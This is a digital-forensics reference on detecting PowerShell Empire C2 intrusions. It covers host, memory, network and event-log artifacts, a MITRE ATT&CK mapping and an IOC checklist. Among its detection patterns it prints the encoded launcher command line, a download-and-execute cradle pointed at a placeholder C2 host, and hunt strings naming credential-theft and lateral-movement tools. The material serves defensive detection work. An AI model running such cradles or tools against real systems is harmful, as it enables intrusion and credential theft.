# PowerShell Empire — DFIR Artifact Reference

## What Is Empire

Post-exploitation C2 framework (now BC Security Empire 4+/5+ with Starkiller GUI). Runs agents **entirely in PowerShell memory** (v1-3) or as C#/.NET/Python agents (v4+). No standalone EXE on disk by default.

### Components
- **Listeners** — server-side handlers (HTTP, HTTPS, DNS, OneDrive, Dropbox)
- **Stagers** — initial payloads that bootstrap the agent (bat, vbs, macro, HTA, DLL, shellcode)
- **Agents** — the implant running on the compromised host
- **Modules** — post-exploitation capabilities (mimikatz, lateral movement, persistence, exfil)

### Execution Flow
```
Delivery → Stager executes → Downloads & decrypts full agent → Agent checks in → Operator tasks modules
```

Communications are AES-256 encrypted with RSA key exchange during staging.

---

## Host-Based Artifacts

### PowerShell Execution Traces
| Location | What to look for |
|----------|-----------------|
| `ConsoleHost_history.txt` | `%APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\` — may capture stager commands |
| Prefetch | `POWERSHELL.EXE-*.pf` — execution timestamps |
| Amcache / Shimcache | Evidence of `powershell.exe` or renamed copies executing |
| NTFS ($MFT / USN Journal) | `.ps1`, `.bat`, `.vbs`, `.hta` stager files in `%TEMP%`, `%APPDATA%` |

### Default Launcher Signature
```
powershell -noP -sta -w 1 -enc <BASE64_BLOB>
```

Suspicious flag combinations: `-noP` (NoProfile), `-sta` (single-threaded), `-w 1` (hidden), `-enc` (EncodedCommand), `-ep bypass` (ExecutionPolicy Bypass)

Decoded base64 reveals:
- Download cradle: `IEX (New-Object Net.WebClient).DownloadString('http://<C2>/stager')`
- Or embedded AES-encrypted blob with `[System.Security.Cryptography.AesManaged]`

### WMI Persistence
Empire's WMI persistence creates event subscriptions in `root\subscription`:
- `__EventFilter` — trigger condition
- `CommandLineEventConsumer` — payload execution
- `__FilterToConsumerBinding` — links filter to consumer

On-disk: `C:\Windows\System32\wbem\Repository\OBJECTS.DATA`

### Scheduled Task Persistence
- Tasks execute `powershell.exe -noP -w hidden -enc <blob>`
- Names mimic legitimate tasks (`Updater`, `SystemHealthCheck`)
- Artifacts: `C:\Windows\System32\Tasks\<TaskName>` (XML), TaskScheduler Event IDs 106/200/201

### Registry Persistence
Run keys containing `powershell`, `-enc`, base64 strings:
```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run
HKLM\Software\Microsoft\Windows\CurrentVersion\Run
```

### Stager Disk Artifacts
Even though agent is "fileless," stagers often touch disk:
- `.bat`, `.vbs`, `.hta`, `.lnk` files in `%TEMP%`, Downloads, `%APPDATA%`
- Office documents with macros (if macro stager used)

---

## Memory Artifacts

| Artifact | Details |
|----------|--------|
| PowerShell process | `powershell.exe` with suspicious args (`-enc`, `-noP`, `-w 1`), child of `cmd.exe`, `wscript.exe`, `mshta.exe`, `wmiprvse.exe` |
| CLR in unexpected process | `clr.dll` / `clrjit.dll` loaded in `notepad.exe`, `svchost.exe` (if using inject/unmanaged PS) |
| .NET assembly strings | `System.Management.Automation`, `InvokePS`, `Empire`, `GetSysInfo` |
| Agent strings | `YOURSERVER`, session key patterns, `/admin/get.php`, `/login/process.php`, `/news.php` |
| AES crypto artifacts | `AesManaged`, `RijndaelManaged`, `ICryptoTransform` near decoded PowerShell |
| Reflective loading | PE headers (MZ/PE) in non-image memory — Empire reflectively loads mimikatz, Rubeus, etc. |

### Process Tree Red Flags
```
winword.exe → cmd.exe → powershell.exe -noP -sta -w 1 -enc ...
mshta.exe → powershell.exe -noP -sta -w 1 -enc ...
wmiprvse.exe → powershell.exe ...
wscript.exe → powershell.exe ...
```
Any `powershell.exe` spawned by Office, `mshta.exe`, `wscript.exe`, or `wmiprvse.exe` with encoded commands = high-fidelity alert.

---

## Network Artifacts

### Default HTTP Listener
| Parameter | Default |
|-----------|---------|
| Port | 80 (HTTP) or 443 (HTTPS) |
| URIs | `/admin/get.php`, `/login/process.php`, `/news.php` |
| User-Agent | Mimics legitimate browsers (configurable) |
| Cookie | Session key data encoded |
| POST body | AES-encrypted tasking/results |

### Staging Traffic Pattern
1. GET with routing packet in cookie → returns RSA public key
2. POST with RSA-encrypted session key → returns AES-encrypted agent code
3. Agent checks in periodically via GET; returns results via POST

### Network IOCs
- Beaconing pattern: regular intervals (default 5s sleep, 0% jitter)
- Self-signed TLS certificates (default HTTPS listener)
- JA3/JA3S hashes from Python-based listener differ from legitimate web servers
- DNS listener: high-volume TXT queries with encoded subdomains
- Large POST bodies when returning mimikatz output or screenshots

---

## Event Log Artifacts

### PowerShell Logs (CRITICAL)

| Event ID | Log | Significance |
|----------|-----|-------------|
| **4104** | PowerShell/Operational | **Script Block Logging — captures deobfuscated agent code. THE gold mine.** |
| 4103 | PowerShell/Operational | Module/pipeline logging — cmdlet invocations |
| 4688 | Security | Process creation — captures `powershell -enc` command line |
| 400/403 | Windows PowerShell | Engine start/stop — `HostApplication` shows command line |

**Script Block Logging (4104) captures the final decoded script** even when Empire encodes/encrypts its payload. Reveals: `Invoke-Empire`, `Start-Negotiate`, `Invoke-Mimikatz`, etc.

### Strings to Hunt in 4104 Logs
```
Invoke-Empire
Start-Negotiate
Invoke-Mimikatz
Invoke-ReflectivePEInjection
Invoke-Kerberoast
Invoke-SMBExec
Invoke-WMIExec
[Convert]::FromBase64String
[System.Security.Cryptography.AesManaged]
-bxor
```

### WMI Events
| Event ID | Log | Significance |
|----------|-----|-------------|
| 5857 | WMI-Activity/Operational | Provider loaded |
| 5859-5861 | WMI-Activity/Operational | Permanent event subscription created/modified/deleted |

### Sysmon (if deployed)
| Event ID | Significance |
|----------|-------------|
| 1 | Process creation — full command line + hashes |
| 3 | Network connections from PowerShell to C2 |
| 7 | Image loads — CLR DLLs in unexpected processes |
| 8 | CreateRemoteThread — process injection |
| 13 | Registry modifications — persistence |
| 19-21 | WMI events (filter, consumer, binding) |

---

## MITRE ATT&CK Mapping

| Tactic | ID | Technique | Empire Feature |
|--------|-----|-----------|---------------|
| Execution | T1059.001 | PowerShell | Core agent mechanism |
| Execution | T1047 | WMI | `invoke_wmi`, WMI persistence |
| Persistence | T1547.001 | Registry Run Keys | `persistence/*/registry` |
| Persistence | T1546.003 | WMI Event Subscription | `persistence/*/wmi` |
| Persistence | T1053.005 | Scheduled Task | `persistence/*/schtasks` |
| Credential Access | T1003.001 | LSASS Memory | `mimikatz/logonpasswords` |
| Credential Access | T1003.006 | DCSync | `mimikatz/dcsync` |
| Credential Access | T1558.003 | Kerberoasting | `invoke_kerberoast` |
| Defense Evasion | T1027 | Obfuscated Files | Base64 + AES encryption |
| Defense Evasion | T1562.001 | AMSI Bypass | Built into agent startup |
| Defense Evasion | T1070.001 | Clear Event Logs | `clear_event_logs` |
| Lateral Movement | T1021.002 | SMB/Admin Shares | `invoke_smbexec` |
| Lateral Movement | T1021.006 | WinRM | `invoke_winrm` |
| C2 | T1071.001 | Web Protocols | HTTP/HTTPS listeners |
| C2 | T1071.004 | DNS | DNS listener |
| C2 | T1573.001 | Symmetric Crypto | AES-256 encrypted comms |
| C2 | T1102 | Web Service | OneDrive/Dropbox listeners |

---

## IOC Checklist

```
[ ] powershell.exe with -enc + -noP + -sta + -w 1 combination
[ ] Script Block Log (4104) containing Invoke-Empire, Start-Negotiate, agent functions
[ ] WMI permanent event subscriptions referencing powershell or encoded commands
[ ] Scheduled tasks calling powershell with -enc from %TEMP% or %APPDATA%
[ ] powershell.exe spawned by wmiprvse.exe, mshta.exe, or Office processes
[ ] Long base64 -enc arguments (>500 characters)
[ ] CLR DLLs loaded in processes that don't normally use .NET
[ ] Beaconing to default Empire URIs (/admin/get.php, /login/process.php, /news.php)
[ ] Self-signed TLS certificates on suspected C2
[ ] Stager files (.bat, .vbs, .hta) in TEMP/APPDATA with powershell commands
[ ] Registry run keys with base64/encoded PowerShell
[ ] Prefetch + Amcache/Shimcache for powershell.exe execution timeline
```
